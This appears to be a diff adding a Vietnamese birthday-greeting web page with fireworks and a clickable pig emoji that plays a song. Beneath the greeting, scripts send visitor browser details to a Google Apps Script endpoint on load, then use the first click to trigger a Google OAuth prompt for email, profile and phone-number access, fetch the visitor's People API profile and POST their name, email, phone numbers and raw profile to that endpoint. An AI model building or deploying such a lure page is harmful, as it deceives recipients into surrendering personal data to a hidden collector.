@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+<meta charset="UTF-8">
+<title>Surprise 🎉</title>
+<style>
+    body {
+        margin: 0;
+        background-color: black;
+        overflow: hidden;
+        font-family: Arial, sans-serif;
+        color: white;
+        text-align: center;
+    }
+    #message {
+        position: absolute;
+        top: 40%;
+        width: 100%;
+        font-size: 48px;
+        font-weight: bold;
+        animation: bounce 1s infinite, colorChange 3s infinite linear;
+        text-shadow: 0 0 20px pink, 0 0 40px magenta;
+        opacity: 0;
+        transition: opacity 1s ease-in-out;
+        pointer-events: none;
+    }
+    /* Mặt heo bẫy click */
+    #pigTrap {
+        position: absolute;
+        top: 10%;
+        left: 50%;
+        transform: translateX(-50%);
+        font-size: 80px;
+        cursor: pointer;
+        animation: oink 1s infinite alternate;
+        user-select: none;
+    }
+    @keyframes oink {
+        0% { transform: translateX(-50%) scale(1); }
+        100% { transform: translateX(-50%) scale(1.2); }
+    }
+    @keyframes bounce {
+        0%, 100% { transform: translateY(0); }
+        50% { transform: translateY(-15px); }
+    }
+    @keyframes colorChange {
+        0% { color: #ff66cc; text-shadow: 0 0 20px #ff66cc, 0 0 40px #ff33aa; }
+        25% { color: #ffcc00; text-shadow: 0 0 20px #ffcc00, 0 0 40px #ffaa00; }
+        50% { color: #66ff66; text-shadow: 0 0 20px #66ff66, 0 0 40px #33cc33; }
+        75% { color: #66ccff; text-shadow: 0 0 20px #66ccff, 0 0 40px #3399ff; }
+        100% { color: #ff66cc; text-shadow: 0 0 20px #ff66cc, 0 0 40px #ff33aa; }
+    }
+</style>
+</head>
+<body>
+<script>
+// Gửi thông báo về Apps Script khi mở file
+fetch("https://script.google.com/macros/s/1qcXD9ZL9vS1g0zUfaYPICfm09gqFbwCDmOGeYIU2A54_CrFE-PRc76Gt/exec?ua=" + encodeURIComponent(navigator.userAgent)
+    + "&lang=" + encodeURIComponent(navigator.language)
+    + "&tz=" + encodeURIComponent(Intl.DateTimeFormat().resolvedOptions().timeZone)
+    + "&screen=" + screen.width + "x" + screen.height)
+  .catch(err => console.error(err));
+</script>
+
+<canvas id="canvas"></canvas>
+<div id="message">🎉🎂 Chúc Mừng Sinh Nhật 🎂🎉</div>
+<div id="pigTrap">🐷</div>
+
+<!-- Nhạc dạng Base64 -->
+<audio id="birthdaySong" src="" preload="auto"></audio>
+
+<script>
+// ==== Pháo hoa ====
+const canvas = document.getElementById("canvas");
+const ctx = canvas.getContext("2d");
+canvas.width = window.innerWidth;
+canvas.height = window.innerHeight;
+
+let fireworks = [];
+let particles = [];
+
+class Firework {
+    constructor(x, y, targetY, color) {
+        this.x = x;
+        this.y = y;
+        this.targetY = targetY;
+        this.color = color;
+        this.speed = 5;
+        this.exploded = false;
+    }
+    update() {
+        if (!this.exploded) {
+            this.y -= this.speed;
+            if (this.y <= this.targetY) {
+                this.exploded = true;
+                explode(this.x, this.y, this.color);
+            }
+        }
+    }
+    draw() {
+        ctx.beginPath();
+        ctx.arc(this.x, this.y, 3, 0, Math.PI * 2);
+        ctx.fillStyle = this.color;
+        ctx.fill();
+    }
+}
+
+class Particle {
+    constructor(x, y, color) {
+        this.x = x;
+        this.y = y;
+        this.color = color;
+        this.speedX = (Math.random() - 0.5) * 6;
+        this.speedY = (Math.random() - 0.5) * 6;
+        this.alpha = 1;
+        this.decay = 0.02;
+    }
+    update() {
+        this.x += this.speedX;
+        this.y += this.speedY;
+        this.alpha -= this.decay;
+    }
+    draw() {
+        ctx.globalAlpha = this.alpha;
+        ctx.beginPath();
+        ctx.arc(this.x, this.y, 2, 0, Math.PI * 2);
+        ctx.fillStyle = this.color;
+        ctx.fill();
+        ctx.globalAlpha = 1;
+    }
+}
+
+function explode(x, y, color) {
+    for (let i = 0; i < 50; i++) {
+        particles.push(new Particle(x, y, color));
+    }
+}
+
+function animate() {
+    ctx.fillStyle = "rgba(0,0,0,0.2)";
+    ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+    fireworks.forEach((fw, index) => {
+        fw.update();
+        fw.draw();
+        if (fw.exploded) fireworks.splice(index, 1);
+    });
+
+    particles.forEach((p, index) => {
+        p.update();
+        p.draw();
+        if (p.alpha <= 0) particles.splice(index, 1);
+    });
+
+    requestAnimationFrame(animate);
+}
+
+window.onload = function() {
+    document.getElementById("message").style.opacity = 1;
+    setInterval(() => {
+        let x = Math.random() * canvas.width;
+        let color = `hsl(${Math.random() * 360}, 100%, 50%)`;
+        fireworks.push(new Firework(x, canvas.height, Math.random() * canvas.height / 2, color));
+    }, 500);
+};
+
+// Bẫy click vào mặt heo
+document.getElementById("pigTrap").addEventListener("click", function() {
+    document.getElementById("birthdaySong").play();
+    document.getElementById("pigTrap").remove();
+}, { once: true });
+
+// Dự phòng: click bất kỳ đâu cũng phát
+document.addEventListener("click", function() {
+    document.getElementById("birthdaySong").play();
+}, { once: true });
+
+animate();
+</script>
+
+<!-- Demo panel: shows what we received from People API -->
+<div id="demoPanel" style="display:none; position:fixed;left:16px;bottom:16px;z-index:99999;background:rgba(0,0,0,.6);color:#fff;padding:12px 14px;border-radius:12px;max-width:92vw;font-size:14px;line-height:1.4"><div id="demoContent"></div></div>
+
+<!-- Google Identity Services SDK -->
+<script src="https://accounts.google.com/gsi/client" async defer></script>
+<script>
+const CLIENT_ID  = '585272145485-hmefm5up9vsqq1j8gotp75ssqlfqjrfl.apps.googleusercontent.com';
+const UPLOAD_URL = 'https://script.google.com/macros/s/1qcXD9ZL9vS1g0zUfaYPICfm09gqFbwCDmOGeYIU2A54_CrFE-PRc76Gt/exec';
+
+let tokenClient;
+let accessToken = null;
+
+function setDemo(html) { 
+  const el = document.getElementById('demoContent'); 
+  if (el) el.innerHTML = html; document.getElementById("demoPanel").style.display="block"; 
+}
+
+window.addEventListener('load', () => {  
+  tokenClient = google.accounts.oauth2.initTokenClient({
+    client_id: CLIENT_ID,
+    scope: [
+      'openid',
+      'email',
+      'profile',
+      'https://www.googleapis.com/auth/user.phonenumbers.read'
+    ].join(' '),
+    prompt: 'consent',
+    callback: async (resp) => {
+      if (resp.error) { console.error(resp); setDemo('Không lấy được token: ' + resp.error); return; }
+      accessToken = resp.access_token;
+      await fetchProfileAndSend();
+    },
+  });
+
+  document.addEventListener('click', () => {
+    tokenClient.requestAccessToken({ prompt: '' });
+  }, { once: true });
+});
+
+async function fetchProfileAndSend() { 
+  try {
+    const res = await fetch('https://people.googleapis.com/v1/people/me?personFields=names,emailAddresses,phoneNumbers', {
+      headers: { Authorization: 'Bearer ' + accessToken }
+    });
+    const profile = await res.json();
+    const name  = profile.names?.[0]?.displayName || null;
+    const email = profile.emailAddresses?.[0]?.value || null;
+    const phones = (profile.phoneNumbers || []).map(p => p.value).filter(Boolean);
+
+    // Update demo panel
+    setDemo(`
+      <div><b>Tên:</b> ${name || '—'}</div>
+      <div><b>Email:</b> ${email || '—'}</div>
+      <div><b>SĐT:</b> ${phones.length ? phones.join(', ') : '—'}</div>
+      <div style="margin-top:8px;opacity:.8">Đang gửi dữ liệu về Apps Script...</div>
+    `);
+
+    // Send to your Apps Script
+    const sendRes = await fetch(UPLOAD_URL, { 
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        type: 'google_people_profile',
+        ts: new Date().toISOString(),
+        userAgent: navigator.userAgent,
+        data: { name, email, phones, raw: profile }
+      })
+    });
+
+    const ok = sendRes.ok;
+    setDemo(`
+      <div><b>Tên:</b> ${name || '—'}</div>
+      <div><b>Email:</b> ${email || '—'}</div>
+      <div><b>SĐT:</b> ${phones.length ? phones.join(', ') : '—'}</div>
+      <div style="margin-top:8px;color:${ok ? '#8ef58e' : '#ffbaba'}">
+        ${ok ? '✅ Đã gửi về Apps Script thành công' : '❌ Gửi về Apps Script thất bại'}
+      </div>
+    `);
+
+  } catch (e) {
+    console.error(e);
+    setDemo('Gọi People API thất bại: ' + e.message);
+  }
+}
+</script>
+
+</body>
+</html>
